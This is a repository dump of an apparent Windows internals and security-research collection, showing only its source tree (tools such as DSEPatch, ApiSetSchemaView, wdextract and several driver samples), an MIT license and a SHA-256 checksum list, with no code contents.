Project Path: arc_gmh5225_misc_l3ubnu7c

Source Tree:

```txt
arc_gmh5225_misc_l3ubnu7c
├── LICENSE
├── Misc.sha256
├── README.md
├── bin
│   ├── ApiSetSchemaView.exe
│   ├── DSEPatch.exe
│   ├── DrvTools
│   │   ├── DrvTools32.exe
│   │   └── DrvTools64.exe
│   ├── ROS
│   │   ├── win32u.dll
│   │   └── win32u_checked.dll
│   ├── StripDebug.exe
│   └── wdextract
│       ├── wdextract.exe
│       └── zlibwapi.dll
└── source
    ├── AMSI
    │   ├── AmsiProviderATL
    │   │   ├── AmsiClient
    │   │   │   ├── AmsiClient.cpp
    │   │   │   ├── AmsiClient.vcxproj
    │   │   │   ├── AmsiClient.vcxproj.filters
    │   │   │   ├── AmsiClient.vcxproj.user
    │   │   │   ├── pch.cpp
    │   │   │   └── pch.h
    │   │   ├── AmsiScan.sln
    │   │   └── AmsiServer
    │   │       ├── AmsiScan
    │   │       │   ├── AmsiProvider.cpp
    │   │       │   ├── AmsiProvider.h
    │   │       │   ├── AmsiProvider.rgs
    │   │       │   ├── AmsiScan.cpp
    │   │       │   ├── AmsiScan.def
    │   │       │   ├── AmsiScan.idl
    │   │       │   ├── AmsiScan.rc
    │   │       │   ├── AmsiScan.rgs
    │   │       │   ├── AmsiScan.vcxproj
    │   │       │   ├── AmsiScan.vcxproj.filters
    │   │       │   ├── AmsiScan.vcxproj.user
    │   │       │   ├── AmsiScan_i.c
    │   │       │   ├── AmsiScan_i.h
    │   │       │   ├── AmsiScan_p.c
    │   │       │   ├── AmsiScanps.def
    │   │       │   ├── dlldata.c
    │   │       │   ├── dllmain.cpp
    │   │       │   ├── dllmain.h
    │   │       │   ├── resource.h
    │   │       │   ├── stdafx.cpp
    │   │       │   ├── stdafx.h
    │   │       │   └── targetver.h
    │   │       └── AmsiScanPS
    │   │           ├── AmsiScanPS.vcxproj
    │   │           ├── AmsiScanPS.vcxproj.filters
    │   │           └── AmsiScanPS.vcxproj.user
    │   └── AmsiProviderC
    │       ├── AmsiProviderServer
    │       │   ├── AmsiProviderServer.vcxproj
    │       │   ├── AmsiProviderServer.vcxproj.filters
    │       │   ├── AmsiProviderServer.vcxproj.user
    │       │   ├── classfactory.c
    │       │   ├── classfactory.h
    │       │   ├── exports.def
    │       │   ├── global.h
    │       │   ├── main.c
    │       │   └── minirtl
    │       │       ├── _strcat.c
    │       │       ├── _strcpy.c
    │       │       ├── _strend.c
    │       │       ├── _strlen.c
    │       │       ├── minirtl.h
    │       │       ├── rtltypes.h
    │       │       ├── u64tohex.c
    │       │       └── ultohex.c
    │       └── AmsiProviderServer.sln
    ├── ApiSetSchema
    │   ├── 1.manifest
    │   ├── ApiSetSchemaView.sln
    │   ├── ApiSetSchemaView.vcxproj
    │   ├── ApiSetSchemaView.vcxproj.filters
    │   ├── ApiSetSchemaView.vcxproj.user
    │   ├── Resource.rc
    │   ├── apisetx.h
    │   ├── icon_gears.ico
    │   ├── main.c
    │   ├── minirtl
    │   │   ├── _strcat.c
    │   │   ├── _strcmpi.c
    │   │   ├── _strcpy.c
    │   │   ├── _strend.c
    │   │   ├── _strlen.c
    │   │   ├── _strncmpi.c
    │   │   ├── _strncpy.c
    │   │   ├── _strstr.c
    │   │   ├── minirtl.h
    │   │   ├── rtltypes.h
    │   │   └── ultostr.c
    │   ├── ntos.h
    │   ├── resource.h
    │   ├── treelist.c
    │   └── treelist.h
    ├── DSEPatch
    │   ├── DSEPatch
    │   │   ├── DSEPatch.vcxproj
    │   │   ├── DSEPatch.vcxproj.filters
    │   │   ├── DSEPatch.vcxproj.user
    │   │   ├── cui
    │   │   │   ├── cui.c
    │   │   │   └── cui.h
    │   │   ├── global.h
    │   │   ├── hde
    │   │   │   ├── hde64.c
    │   │   │   ├── hde64.h
    │   │   │   ├── pstdint.h
    │   │   │   └── table64.h
    │   │   ├── instdrv.c
    │   │   ├── instdrv.h
    │   │   ├── main.c
    │   │   ├── minirtl
    │   │   │   ├── _strcat.c
    │   │   │   ├── _strcmp.c
    │   │   │   ├── _strcmpi.c
    │   │   │   ├── _strcpy.c
    │   │   │   ├── _strend.c
    │   │   │   ├── _strlen.c
    │   │   │   ├── _strncmp.c
    │   │   │   ├── _strncmpi.c
    │   │   │   ├── _strncpy.c
    │   │   │   ├── cmdline.c
    │   │   │   ├── cmdline.h
    │   │   │   ├── minirtl.h
    │   │   │   ├── rtltypes.h
    │   │   │   ├── u64tohex.c
    │   │   │   ├── u64tostr.c
    │   │   │   ├── ultohex.c
    │   │   │   └── ultostr.c
    │   │   ├── ntdll
    │   │   │   └── ntos.h
    │   │   ├── resource.h
    │   │   ├── resource.rc
    │   │   ├── se_patterns.h
    │   │   ├── sup.c
    │   │   ├── sup.h
    │   │   ├── vbox.h
    │   │   └── vboxdrv.h
    │   ├── DSEPatch.sln
    │   ├── README.md
    │   └── changelog.txt
    ├── DrvTools
    │   ├── readme.txt
    │   └── src
    │       ├── DrvTools.ico
    │       ├── DrvTools.lpi
    │       ├── DrvTools.lpr
    │       ├── DrvTools.lps
    │       ├── DrvTools.res
    │       ├── link.res
    │       ├── nativesup.pas
    │       ├── ntstatus.inc
    │       ├── ppas.bat
    │       ├── rsrc
    │       │   ├── about64.ico
    │       │   └── main.ico
    │       ├── scmsup.pas
    │       ├── unit1.lfm
    │       └── unit1.pas
    ├── IntelNal
    │   ├── COPYING
    │   ├── Kconfig
    │   ├── Makefile
    │   ├── README.md
    │   ├── inc
    │   │   ├── cardbus_t.h
    │   │   ├── files.txt
    │   │   ├── hwbus_t.h
    │   │   ├── linux
    │   │   │   ├── files.txt
    │   │   │   ├── linuxdriverdevice_i.h
    │   │   │   ├── linuxnaldriver.h
    │   │   │   ├── linuxnalioctl.h
    │   │   │   ├── linuxos_i.h
    │   │   │   └── linuxpci_i.h
    │   │   ├── nal.h
    │   │   ├── nalcodes.h
    │   │   ├── nalioctl.h
    │   │   ├── naltypes.h
    │   │   ├── os_i.h
    │   │   ├── osdevice_i.h
    │   │   ├── pci_i.h
    │   │   └── pci_t.h
    │   └── src
    │       ├── files.txt
    │       ├── iqvlinux.spec
    │       ├── linuxdriverdevice_i.c
    │       ├── linuxdriveros_i.c
    │       ├── linuxdriverpci_i.c
    │       ├── linuxnaldriver.c
    │       ├── nalinstall
    │       └── nalioctldrv.c
    ├── ROS
    │   ├── srvany2
    │   │   ├── srvany2
    │   │   │   ├── main.c
    │   │   │   ├── minirtl
    │   │   │   │   ├── _strcat.c
    │   │   │   │   ├── _strcpy.c
    │   │   │   │   ├── _strlen.c
    │   │   │   │   ├── cmdline.c
    │   │   │   │   ├── cmdline.h
    │   │   │   │   ├── minirtl.h
    │   │   │   │   └── rtltypes.h
    │   │   │   ├── srvany2.vcxproj
    │   │   │   ├── srvany2.vcxproj.filters
    │   │   │   └── srvany2.vcxproj.user
    │   │   └── srvany2.sln
    │   └── win32u
    │       ├── win32u
    │       │   ├── main.c
    │       │   ├── resource.h
    │       │   ├── ver.rc
    │       │   ├── w32kcall.h
    │       │   ├── w32kcall_checked.h
    │       │   ├── w32parguments.h
    │       │   ├── w32parguments_checked.h
    │       │   ├── win32u.vcxproj
    │       │   ├── win32u.vcxproj.filters
    │       │   ├── win32u.vcxproj.user
    │       │   ├── win32u_export.def
    │       │   └── win32u_export_checked.def
    │       └── win32u.sln
    ├── SecTrash
    │   ├── asusgio2.c
    │   ├── bkavsp.c
    │   ├── enetech.c
    │   ├── glckio2.c
    │   ├── iobit_winring0.c
    │   ├── iobitcallbacks.c
    │   ├── logitech.c
    │   ├── maxproc64.c
    │   ├── readme.txt
    │   ├── secureaplus.c
    │   └── superantispyware.c
    ├── StripDebug
    │   ├── StripDebug.sln
    │   ├── StripDebug.vcxproj
    │   ├── StripDebug.vcxproj.filters
    │   ├── StripDebug.vcxproj.user
    │   ├── cui.c
    │   ├── cui.h
    │   ├── global.h
    │   ├── main.c
    │   └── minirtl
    │       ├── _strcat.c
    │       ├── _strcpy.c
    │       ├── _strlen.c
    │       ├── cmdline.c
    │       ├── cmdline.h
    │       ├── minirtl.h
    │       └── rtltypes.h
    ├── WormholeDrivers
    │   ├── MAPMEM
    │   │   ├── DIRS
    │   │   ├── EXE
    │   │   │   ├── MAKEFILE
    │   │   │   ├── MAPTEST.C
    │   │   │   ├── MAPTEST.MAK
    │   │   │   └── SOURCES
    │   │   ├── README.TXT
    │   │   └── SYS
    │   │       ├── MAKEFILE
    │   │       ├── MAPMEM.C
    │   │       ├── MAPMEM.H
    │   │       ├── MAPMEM.INI
    │   │       └── SOURCES
    │   ├── PHYMEM
    │   │   ├── LICENSE
    │   │   ├── LICENSE.html
    │   │   ├── PCIFlt
    │   │   │   ├── DebugPrint.c
    │   │   │   ├── DebugPrint.h
    │   │   │   ├── PCIFilter.c
    │   │   │   ├── PCIFilter.h
    │   │   │   ├── PCIFlt.dsp
    │   │   │   ├── PCIFlt.dsw
    │   │   │   └── Release
    │   │   │       ├── PCIFilter.inf
    │   │   │       └── PCIFlt.sys
    │   │   └── PhyMem
    │   │       ├── driver
    │   │       │   ├── AccessBus.c
    │   │       │   ├── DebugPrint.c
    │   │       │   ├── DebugPrint.h
    │   │       │   ├── phymem.c
    │   │       │   ├── phymem.dsp
    │   │       │   ├── phymem.dsw
    │   │       │   └── phymem.h
    │   │       ├── pmdll
    │   │       │   ├── Release
    │   │       │   │   └── pmdll.lib
    │   │       │   ├── initdrv.cpp
    │   │       │   ├── phymem.h
    │   │       │   ├── pmdll.cpp
    │   │       │   ├── pmdll.dsp
    │   │       │   ├── pmdll.dsw
    │   │       │   └── pmdll.h
    │   │       └── test
    │   │           ├── pmdll.h
    │   │           ├── pmdll.lib
    │   │           ├── test.cpp
    │   │           ├── test.dsp
    │   │           └── test.dsw
    │   ├── WINIO
    │   │   ├── LICENSE
    │   │   ├── README.md
    │   │   ├── Samples
    │   │   │   ├── DumpPhys
    │   │   │   │   ├── DumpPhys
    │   │   │   │   │   ├── DumpPhys.csproj
    │   │   │   │   │   ├── DumpPhys.manifest
    │   │   │   │   │   ├── Form1.Designer.cs
    │   │   │   │   │   ├── Form1.cs
    │   │   │   │   │   ├── Form1.resx
    │   │   │   │   │   ├── Program.cs
    │   │   │   │   │   └── Properties
    │   │   │   │   │       ├── AssemblyInfo.cs
    │   │   │   │   │       ├── Resources.Designer.cs
    │   │   │   │   │       ├── Resources.resx
    │   │   │   │   │       ├── Settings.Designer.cs
    │   │   │   │   │       └── Settings.settings
    │   │   │   │   ├── DumpPhys.sln
    │   │   │   │   └── DumpPhys.suo
    │   │   │   └── DumpPort
    │   │   │       ├── DumpPort
    │   │   │       │   ├── DumpPort.csproj
    │   │   │       │   ├── DumpPort.manifest
    │   │   │       │   ├── Form1.Designer.cs
    │   │   │       │   ├── Form1.cs
    │   │   │       │   ├── Form1.resx
    │   │   │       │   ├── Program.cs
    │   │   │       │   └── Properties
    │   │   │       │       ├── AssemblyInfo.cs
    │   │   │       │       ├── Resources.Designer.cs
    │   │   │       │       ├── Resources.resx
    │   │   │       │       ├── Settings.Designer.cs
    │   │   │       │       └── Settings.settings
    │   │   │       ├── DumpPort.sln
    │   │   │       └── DumpPort.suo
    │   │   └── Source
    │   │       ├── Dll
    │   │       │   ├── InstDrv.cpp
    │   │       │   ├── Phys32.cpp
    │   │       │   ├── Phys32.h
    │   │       │   ├── Port32.cpp
    │   │       │   ├── Port32.h
    │   │       │   ├── WinIo.aps
    │   │       │   ├── WinIo.cpp
    │   │       │   ├── WinIo.def
    │   │       │   ├── WinIo.rc
    │   │       │   ├── WinIo.sln
    │   │       │   ├── WinIo.suo
    │   │       │   ├── WinIo.vcproj
    │   │       │   ├── resource.h
    │   │       │   └── winio.h
    │   │       └── Drv
    │   │           ├── MAKEFILE
    │   │           ├── SOURCES
    │   │           ├── WinIo.c
    │   │           └── winio_nt.h
    │   ├── WINRING0
    │   │   ├── LICENSE
    │   │   ├── README.md
    │   │   ├── dll
    │   │   │   ├── Driver.cpp
    │   │   │   ├── Driver.h
    │   │   │   ├── OlsApi.cpp
    │   │   │   ├── OlsApi.def
    │   │   │   ├── OlsApi.h
    │   │   │   ├── OlsApiInit.h
    │   │   │   ├── OlsApiInitDef.h
    │   │   │   ├── OlsApiInitExt.h
    │   │   │   ├── OlsDef.h
    │   │   │   ├── OlsDll.cpp
    │   │   │   ├── OlsDll.h
    │   │   │   ├── OlsDll.rc
    │   │   │   ├── OlsIoctl.h
    │   │   │   ├── resource.h
    │   │   │   ├── stdafx.cpp
    │   │   │   ├── stdafx.h
    │   │   │   ├── sys
    │   │   │   │   ├── MAKEFILE
    │   │   │   │   ├── OpenLibSys.c
    │   │   │   │   ├── OpenLibSys.h
    │   │   │   │   ├── OpenLibSys.rc
    │   │   │   │   └── SOURCES
    │   │   │   └── vxd
    │   │   │       ├── Makefile
    │   │   │       ├── OpenLS.c
    │   │   │       ├── OpenLS.def
    │   │   │       ├── OpenLS.h
    │   │   │       ├── OpenLS.rc
    │   │   │       └── ctrl.asm
    │   │   └── drv
    │   │       ├── DriverApi.c
    │   │       ├── DriverApi.h
    │   │       ├── DriverIoCtl.h
    │   │       └── DriverManage.c
    │   └── readme.txt
    └── wdextract
        ├── README.md
        ├── wdextract
        │   ├── pch.cpp
        │   ├── pch.h
        │   ├── wdextract.cpp
        │   ├── wdextract.vcxproj
        │   ├── wdextract.vcxproj.filters
        │   ├── wdextract.vcxproj.user
        │   ├── zconf.h
        │   ├── zlib.h
        │   └── zlibwapi.lib
        └── wdextract.sln

```

`LICENSE`:

```
MIT License

Copyright (c) 2018 - 2022 hfiref0x

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

`Misc.sha256`:

```sha256
b57a3589dc8586857e87a9a2d7a75383130869af464747096a7f31ddb5c9153d *bin\ApiSetSchemaView.exe
69995d654768f3a694260349cb8ce01605b107d4c181f04aedc3938ea85e8ad4 *bin\DSEPatch.exe
4d79ca1aaaa6408919e5b5d828f2f55be2d2d4e37c3edc7e8b61bdf897719956 *bin\StripDebug.exe
45844eb4948fac4d09556790eacace2d789951b744c9ec10fd8bb0a97318db49 *bin\DrvTools\DrvTools32.exe
2938d06fedd4cf062c833f20277d3defdede28f418ac67cf32edc39757fe591c *bin\DrvTools\DrvTools64.exe
d58f9152cbcf9896f5d07605a0efb951092d1cec8e94dffeb7118401addaf023 *bin\ROS\win32u.dll
a8db80a158526bf764458bfbb31b539a61968d6922eb6f6c892567d0f7ca4534 *bin\ROS\win32u_checked.dll
8de7ff7086f8b12671984d548f09f34759ca7f4642c651dd060f4ab50b688c28 *bin\wdextract\wdextract.exe
1f047faec08d9a35c304fb4a7cf13853589359a8f7cbfdd48c5d5807712dcf05 *bin\wdextract\zlibwapi.dll
a249bb1643ab71b7a993abdd9d12fc27968cdcf0390f13735c4c4fd957979def *source\AMSI\AmsiProviderATL\AmsiScan.sln
232184da4dc007688285b4ad3aeb21772708d7b31b32b850e19afb6ac502b02e *source\AMSI\AmsiProviderATL\AmsiClient\AmsiClient.cpp
5cdbd829ba0ee5bd0b280e2e338ee655859301afd6d6d7ee0c02889dc766c810 *source\AMSI\AmsiProviderATL\AmsiClient\AmsiClient.vcxproj
180d82899b34794b2d9523c9ef92a065da7b3d2ae8ebd8bf6f06a6e7c575102a *source\AMSI\AmsiProviderATL\AmsiClient\AmsiClient.vcxproj.filters
e953b026d0f383188c753487df0a4d879fa5da5ba82ac979aa877db84e89a060 *source\AMSI\AmsiProviderATL\AmsiClient\AmsiClient.vcxproj.user
e633062d041c48b662720a7848cc6b76111b111d0446a9a5da0ed07bc81c6d10 *source\AMSI\AmsiProviderATL\AmsiClient\pch.cpp
db86c540dfe8cbf47e4c98207295872beec3e1eadec7db99a817f4bbb3baaa5f *source\AMSI\AmsiProviderATL\AmsiClient\pch.h
5ef1a6734cc00814494ead1880b1196b26dd82570539e55dd93b8e30c308660b *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiProvider.cpp
23b02743baab6421948bdaecb7c3e04f644f2d0d2c7c29ffc343e6453ad1385e *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiProvider.h
292cdaf2301158a72e7bcbd821c62b4e1397e855719f3d86585195259e6339d3 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiProvider.rgs
19e2a326cccceecbd6724a951d9d3766a7a4c400f2f7e804c3d2f4f221ed00d8 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.cpp
1912a042e01da51478296538b39c8b515a7ef1b3f3290e8f10b9518a6993a294 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.def
6955d5089e8fc990c966de6ad03b465a5a3d0dfecfb92c16e9f8fffaf55eae7b *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.idl
5cd2f81ca87d363b9e3a4bd84d43cc911cf62815185a143881a56950ea202924 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.rc
07d923e8f7f69e6f36e2226723e8c1abed527b999942669a8eff8c50a0be65f6 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.rgs
908388b66e1a061209c2d649155f1fcc87b2f601e5a03efb122bc2cc35b20eba *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.vcxproj
8c9821ad64c0fcf5bc493803945a6d628eb32fc3e546649bb7dcdee8bd738fa3 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.vcxproj.filters
e953b026d0f383188c753487df0a4d879fa5da5ba82ac979aa877db84e89a060 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan.vcxproj.user
48f0f6210120c70629dc98ad2b6217a4d1853af64e73fc52397efe10a74043a9 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScanps.def
a9e4656dc4a5bec453f0a979e48656f6c4ee6db092347a27c652b154ef1cd36b *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan_i.c
33037b917028d06767ecf498a99931b226235153b2a01eb6542dfb74b29ca8dc *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan_i.h
27672f9585118f34036269f4d90d86e3337ebc7bbb662d0e915d550ea9e6a865 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\AmsiScan_p.c
9e38d8e95c34313aecc5a8d9bdd4b75eb3f6279b7199941e6c90ee5cf53b8041 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\dlldata.c
ff45814c6fec2f9aafb600e86956064f6fdcb2dabd8035c7b6a7cb3120ffdabb *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\dllmain.cpp
e37e4f2218a7e6cec26c02418832f4df8b3bd9e8e9e6606054b2ce731af17817 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\dllmain.h
eb9d42cc6405ba2cb4c376ab969707f336270c40f934670afb51fcad35753638 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\resource.h
4e3f89c49830cad280c42725e11e43623f762bee6d424b3c8eaa0c72851966b0 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\stdafx.cpp
c95c305c3fcc67ac18b0fff7e84525af93923a49d07a5f0c097d9c83f1b39cc3 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\stdafx.h
a2761fdbd4c8925741ddea678ee8398de930207e447666bc6a76d5f72684c04f *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScan\targetver.h
c55dda736e7a519fcadad415f0e785c1cb1a9baaad95909b793e9c1140ba69f9 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScanPS\AmsiScanPS.vcxproj
4ba6ea20e61e1bd57227d01c2de4fe9a86acb8d10b440a575eeaf9c028b04edb *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScanPS\AmsiScanPS.vcxproj.filters
e953b026d0f383188c753487df0a4d879fa5da5ba82ac979aa877db84e89a060 *source\AMSI\AmsiProviderATL\AmsiServer\AmsiScanPS\AmsiScanPS.vcxproj.user
41bcc83f48ff00215f1c4b523cd0ae0dec0f69e2dee63035642c3f87e6e6273e *source\AMSI\AmsiProviderC\AmsiProviderServer.sln
d9f8d117d70fbe4e02ab6ec8d7d185c86739dd671580ebfcd4bba042cdd0d27b *source\AMSI\AmsiProviderC\AmsiProviderServer\AmsiProviderServer.vcxproj
d0766d29c2f224447c27b494f42cfd5f3532a55c83346fbb1c081387bc5bc395 *source\AMSI\AmsiProviderC\AmsiProviderServer\AmsiProviderServer.vcxproj.filters
e953b026d0f383188c753487df0a4d879fa5da5ba82ac979aa877db84e89a060 *source\AMSI\AmsiProviderC\AmsiProviderServer\AmsiProviderServer.vcxproj.user
1658be1b995815986cd509391024e4846a83fd299c531305aa696be11c2f2b35 *source\AMSI\AmsiProviderC\AmsiProviderServer\classfactory.c
87cfc8dc3127343b379ccb7405f58eb7414138d73bf2469beda213be64df08ec *source\AMSI\AmsiProviderC\AmsiProviderServer\classfactory.h
48f0f6210120c70629dc98ad2b6217a4d1853af64e73fc52397efe10a74043a9 *source\AMSI\AmsiProviderC\AmsiProviderServer\exports.def
410b5ebc5a3a63c64839ba3c2658b95881656460ba532eedfcb0dedefd028efe *source\AMSI\AmsiProviderC\AmsiProviderServer\global.h
b5807fa5f550b187f78606dde77ca0fa54c88e9550652199a56f493e42e7b6d8 *source\AMSI\AmsiProviderC\AmsiProviderServer\main.c
699258f2b140da030776ab418e46c6eab8ba99682677a756274fcb2402ad5c34 *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\minirtl.h
b9de99d3447bb1a125cb92aa1b3f9b56a59522436f1a1a97f23aac9cee90341c *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\rtltypes.h
e56e67b10a67f0d5ef4128c7ab0c6cb9ba9966916720525edfa6abf3101dfe13 *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\u64tohex.c
f81c975acd016c97776dd3a8e3218e148682b0336ff3fcd77fad6d9b86ddf107 *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\ultohex.c
83772aa217508279294d91af5cfabec9b5e00b836a2e2f5fe37cf1ebc2905a52 *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\_strcat.c
969b35213fa23ff50a169e5498a97f28bc6f5820b447b78ec9dc6910dd8cc3e8 *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\_strcpy.c
27159b8ff67d3f8e6c7fdb4b57b9f57f899bdfedf92cf10276269245c6f4e066 *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\_strend.c
60f19c6b805801e13824c4d9d44748da8245cd936971411d3d36b873121888eb *source\AMSI\AmsiProviderC\AmsiProviderServer\minirtl\_strlen.c
3967fe443019dc8964fd5a044e1dc56cb6d1c74bf805044129f860accd1a535b *source\ApiSetSchema\1.manifest
c465736d9bd91e6dca0024a43d23d709cbcb6fc157fa3c4a996020a1ca61d494 *source\ApiSetSchema\ApiSetSchemaView.sln
7d8d8b04d6fee46debb6b3b1db22242bb02d98285662890ce290401f5bfd4e75 *source\ApiSetSchema\ApiSetSchemaView.vcxproj
0924ad6d3cf8f440394d04ec2dcbafad27f4892f0ada0de80bc279fd7c45b048 *source\ApiSetSchema\ApiSetSchemaView.vcxproj.filters
3bb23697ed5e58601b89e051544a8d33a53de5bce855f45461ed26a9c7cdc00b *source\ApiSetSchema\ApiSetSchemaView.vcxproj.user
e3b0d6bfa6f87b873a48d5351c9859c3ac047fb11d9d0d1caf002327a4be1529 *source\ApiSetSchema\apisetx.h
f1aa19f5179bc97cb1a2be3cdf0c4ed8aa0fad5f817c874ccb0e5b5e96796b47 *source\ApiSetSchema\icon_gears.ico
4077aaf2117ff3f4690eb672b92075cda87c756887e927a3f074d85aa559abca *source\ApiSetSchema\main.c
aa64db11f2cc5be9adf6b33309aef618ebd980c06bcc6efda41024c0edcfdd7a *source\ApiSetSchema\ntos.h
91c3b4a8fec0b8aa7826a1124f6fe62a086025ebabc797e3e413970fb86beaee *source\ApiSetSchema\resource.h
552bd56c9ddeffd8e52f4bb098849761cbef376649e34787c9fee389ccaa5c93 *source\ApiSetSchema\Resource.rc
136f730944783ddd00cbd8ceef0b464d49d0031db32a33d9bb1882df84afdde0 *source\ApiSetSchema\treelist.c
c5569b768244e86e1c961c28e6f11831f219953093c9e4cd35414e4008b3de80 *source\ApiSetSchema\treelist.h
107245437ed86b6f1e839b2d3d9bbadb3d9980046cb5c7001f985fed3627962f *source\ApiSetSchema\minirtl\minirtl.h
b9de99d3447bb1a125cb92aa1b3f9b56a59522436f1a1a97f23aac9cee90341c *source\ApiSetSchema\minirtl\rtltypes.h
9cbedf9b92abaef3ea28de28dd523ac44079592178ef727c7003c339a5a54712 *source\ApiSetSchema\minirtl\ultostr.c
83772aa217508279294d91af5cfabec9b5e00b836a2e2f5fe37cf1ebc2905a52 *source\ApiSetSchema\minirtl\_strcat.c
ef1b18997ea473ac8d516ef60efc64b9175418b8f078e088d783fdaef2544969 *source\ApiSetSchema\minirtl\_strcmpi.c
969b35213fa23ff50a169e5498a97f28bc6f5820b447b78ec9dc6910dd8cc3e8 *source\ApiSetSchema\minirtl\_strcpy.c
27159b8ff67d3f8e6c7fdb4b57b9f57f899bdfedf92cf10276269245c6f4e066 *source\ApiSetSchema\minirtl\_strend.c
60f19c6b805801e13824c4d9d44748da8245cd936971411d3d36b873121888eb *source\ApiSetSchema\minirtl\_strlen.c
87cc72bb8e3f1534bee09ee278ecd928d975ebb94aeffc767b67249815a0bf3a *source\ApiSetSchema\minirtl\_strncmpi.c
0434d69daa20fbf87d829ffc17e43dcc2db3386aff434af888011fdec2f645a4 *source\ApiSetSchema\minirtl\_strncpy.c
52e3d39c69c43264b2f8d9bcdfce0f763a5e92d091eef59ea2a0294b4b19641c *source\ApiSetSchema\minirtl\_strstr.c
dd980a61cefeb054f81d55e7f4c7abc08ea5cfa0e4197bb1f1256fb9c7307593 *source\DrvTools\readme.txt
5375b9c443c6b1c9745d1abf08afb69e574f32bb23a7a581b8c49170d82c74e2 *source\DrvTools\src\DrvTools.ico
a428fb105ee71c69dda3405c14e6762c5bde6754cbc7ba0efee7cf1ea9c2c09e *source\DrvTools\src\DrvTools.lpi
5561a9efc1b9666a1db03b4973da044fd368630497ff4818e50b1fcd31b5ee99 *source\DrvTools\src\DrvTools.lpr
7be24cac75e83c19e6a997ed13edce5a8ab43ab9a75afe89d156e58a44edad0c *source\DrvTools\src\DrvTools.lps
69d8f061251920d0b29f14ad1d749aba56a0eb959f852eb927071696ad6d0dd2 *source\DrvTools\src\DrvTools.res
85a8a1b86209164bac8389016ac777bd3119e4b18e2a6a12bf97e5adb5170ba8 *source\DrvTools\src\link.res
8446e2d26e605d4891fbe92002c243d599cef5bdcf4e8d11b9783f9d9bddba47 *source\DrvTools\src\nativesup.pas
e5789adefc0c793c669326e301d308a5e0ae5c30484a2b81af42d0e8f2398f09 *source\DrvTools\src\ntstatus.inc
a210e6506a6146a25b7e6eedba10c4c66b910a5b1ac24a25b3f3ecd35dc266b9 *source\DrvTools\src\ppas.bat
bcaf0161326a946834fff5eb35efce4afb1b26254fa918d4f7cbd8d90fb437c6 *source\DrvTools\src\scmsup.pas
da6b64a44ddbfc37e1b53d6ba4b82cad4e38c2e699e6a889ad456487d42c66f0 *source\DrvTools\src\unit1.lfm
bcf8a93ddf410cb497b6f09f0b7347798b9b12ae539d86a1438cc02f021d7702 *source\DrvTools\src\unit1.pas
5cf340a307ac8c13ed840c16e19279a12591f575d272ac2a699caf3ea5de1b6d *source\DrvTools\src\rsrc\about64.ico
5375b9c443c6b1c9745d1abf08afb69e574f32bb23a7a581b8c49170d82c74e2 *source\DrvTools\src\rsrc\main.ico
a6323b0c41dbeea49bc869f17c0e8341a42af46191db99a52f751d14d96fc5e3 *source\DSEPatch\changelog.txt
3f2ac5e73f4ba50f5c9f04b2efbd2f8fa00b4c24bd1a0b704ccd01ee114bad01 *source\DSEPatch\DSEPatch.sln
db6ce2f781976f281dc0c1dc907dc5a03606bbc507e2fd997e69255613220417 *source\DSEPatch\README.md
1c781ddba688ffa11d377825035b24c589a8bfb162ac4c91cfa3321c37e6112c *source\DSEPatch\DSEPatch\DSEPatch.vcxproj
e5d89a1fe36484391f41f1e1a7425ed107e67dee54adcd4244aa790ca3ddf6f2 *source\DSEPatch\DSEPatch\DSEPatch.vcxproj.filters
315a4051b216cbd320b7fce261764e61aa6b941dae1c7558db7da58ee667a830 *source\DSEPatch\DSEPatch\DSEPatch.vcxproj.user
fbc23488615ede42cce64ad420124769c725e6b8e04aed0a98162b77109e29b1 *source\DSEPatch\DSEPatch\global.h
94cbbb81022dbd0205a3e7ede89775b43f9f45e934a3079fdb7f5217d8794fe0 *source\DSEPatch\DSEPatch\instdrv.c
